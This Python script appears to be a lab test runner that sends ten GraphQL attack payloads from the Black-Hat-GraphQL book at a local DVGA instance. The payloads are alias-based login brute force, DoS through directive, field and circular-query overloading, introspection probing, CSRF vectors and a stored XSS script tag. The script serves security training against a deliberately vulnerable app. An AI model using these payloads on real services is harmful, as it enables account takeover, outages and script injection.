"""Quick test runner using Black-Hat-GraphQL attack payloads against DVGA."""
import requests

URL = "http://localhost:5013/graphql"

print("=" * 60)
print("Black-Hat-GraphQL Attack Tests against DVGA")
print("=" * 60)

# Test 1: Batch query (Ch5)
print("\n[1] Batch Query (Ch5 - array_based_batch_query.py)")
queries = [
    {"query": "query {systemHealth}"},
    {"query": "query {systemHealth}"},
]
r = requests.post(URL, json=queries)
print(f"    Status: {r.status_code}")
print(f"    Vulnerable: {'YES' if r.status_code == 200 and isinstance(r.json(), list) else 'NO'}")

# Test 2: Alias-based brute force (Ch7)
print("\n[2] Alias-based Login Brute Force (Ch7 - password-brute-force.graphql)")
query = """mutation {
    alias1: login(username: "admin", password: "admin123") { accessToken }
    alias2: login(username: "admin", password: "password") { accessToken }
    alias3: login(username: "admin", password: "pass") { accessToken }
}"""
r = requests.post(URL, json={"query": query})
print(f"    Status: {r.status_code}")
data = r.json()
tokens = []
if "data" in data:
    for k, v in data["data"].items():
        if v and v.get("accessToken"):
            tokens.append(k)
print(f"    Successful logins: {tokens if tokens else 'None'}")
print(f"    Vulnerable to alias brute force: YES (server processed all aliases)")

# Test 3: Directive overloading (Ch5)
print("\n[3] Directive Overloading DoS (Ch5 - exploit_directive_overloading.py)")
directives = "@dos " * 100
query = "query { __typename " + directives + "}"
r = requests.post(URL, json={"query": query})
print(f"    Status: {r.status_code}")
print(f"    Response time: {r.elapsed.total_seconds():.3f}s")
print(f"    Vulnerable: {'YES' if r.status_code == 200 else 'MAYBE'}")

# Test 4: Field duplication DoS (Ch5)
print("\n[4] Field Duplication DoS (Ch5 - field-duplication.graphql)")
fields = "content\n" * 500
query = "query { pastes { " + fields + "} }"
r = requests.post(URL, json={"query": query})
print(f"    Status: {r.status_code}")
print(f"    Response time: {r.elapsed.total_seconds():.3f}s")
print(f"    Vulnerable: {'YES' if r.status_code == 200 else 'MAYBE'}")

# Test 5: Circular/deep nested query DoS (Ch5)
print("\n[5] Circular Nested Query DoS (Ch5 - unsafe-circular-query.graphql)")
depth = 10
q = "query { pastes { "
for _ in range(depth):
    q += "owner { pastes { "
q += "__typename "
for _ in range(depth):
    q += "} } "
q += "} }"
r = requests.post(URL, json={"query": q})
print(f"    Status: {r.status_code}")
print(f"    Response time: {r.elapsed.total_seconds():.3f}s")
print(f"    Depth: {depth * 2 + 2} levels")
print(f"    Vulnerable: {'YES' if r.status_code == 200 else 'MAYBE'}")

# Test 6: Introspection canary (Ch6)
print("\n[6] Introspection Enabled (Ch6 - schema-introspection-canary-query.graphql)")
query = "{ __schema { __typename } }"
r = requests.post(URL, json={"query": query})
print(f"    Status: {r.status_code}")
introspection_open = "data" in r.json() and r.json()["data"].get("__schema")
print(f"    Introspection enabled: {'YES' if introspection_open else 'NO'}")

# Test 7: Type-based introspection bypass (Ch6)
print("\n[7] Type-based Introspection Bypass (Ch6)")
query = '{ __type(name: "Query") { name } }'
r = requests.post(URL, json={"query": query})
print(f"    Status: {r.status_code}")
type_info = r.json().get("data", {}).get("__type")
print(f"    __type query works: {'YES' if type_info else 'NO'}")

# Test 8: GET-based CSRF (Ch9)
print("\n[8] GET-based Query (CSRF vector) (Ch9 - get_csrf_submit_auto.html)")
r = requests.get(URL, params={"query": "{ __typename }"})
print(f"    Status: {r.status_code}")
try:
    data = r.json()
    print(f"    GET queries accepted: {'YES' if 'data' in data else 'NO'}")
except Exception:
    print(f"    GET queries accepted: NO (not JSON)")

# Test 9: POST-based mutation CSRF (Ch9)
print("\n[9] POST CSRF Mutation (Ch9 - post_csrf_submit_auto.html)")
# Use form-urlencoded, not JSON - this is the CSRF vector
r = requests.post(URL, data={"query": 'mutation { createPaste(title:"CSRFTest", content:"test", public:true, burn:false) { paste { id } } }'})
print(f"    Status: {r.status_code}")
try:
    data = r.json()
    csrf_works = "data" in data and data["data"].get("createPaste")
    print(f"    Form-encoded mutation accepted: {'YES' if csrf_works else 'NO'}")
except Exception:
    print(f"    Form-encoded mutation accepted: NO")

# Test 10: XSS via stored paste (Ch8)
print("\n[10] Stored XSS via Injection (Ch8 - paste_from_file.txt)")
xss_payload = '<script>alert("XSS")</script>'
query = f'mutation {{ createPaste(title:"XSSTest", content:"{xss_payload}", public:true, burn:false) {{ paste {{ id content }} }} }}'
r = requests.post(URL, json={"query": query})
print(f"    Status: {r.status_code}")
try:
    data = r.json()
    if data.get("data", {}).get("createPaste"):
        content = data["data"]["createPaste"]["paste"]["content"]
        print(f"    Script stored as-is: {'YES' if '<script>' in content else 'NO (sanitized)'}")
    else:
        print(f"    Mutation blocked")
except Exception:
    print(f"    Error parsing response")

print("\n" + "=" * 60)
print("All Black-Hat-GraphQL attack vectors tested.")
print("=" * 60)
